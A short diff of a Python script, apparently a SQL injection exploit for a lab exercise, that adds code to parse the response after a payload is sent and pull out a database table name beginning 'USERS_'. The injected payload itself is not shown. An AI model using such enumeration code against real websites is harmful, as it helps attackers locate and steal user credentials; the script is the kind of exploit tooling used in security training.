@@ -34,6 +34,13 @@ if r.status_code == 200:
     print('[*] Payload sent')
     soup = bs4.BeautifulSoup(r.content, 'html.parser')
     rows = soup.select('tbody tr')
+    table_prefix = "<th>USERS_"
     for row in rows:
-        print(row)
+        th = row.find_all('th')
+        th_string = str(th[0])
+        if table_prefix in th_string:
+            td_split_1 = th_string.split('>')
+            td_split_2 = td_split_1[1].split('<')
+            table_name = td_split_2[0]
+            print("[*] Table name found: " + table_name)
 
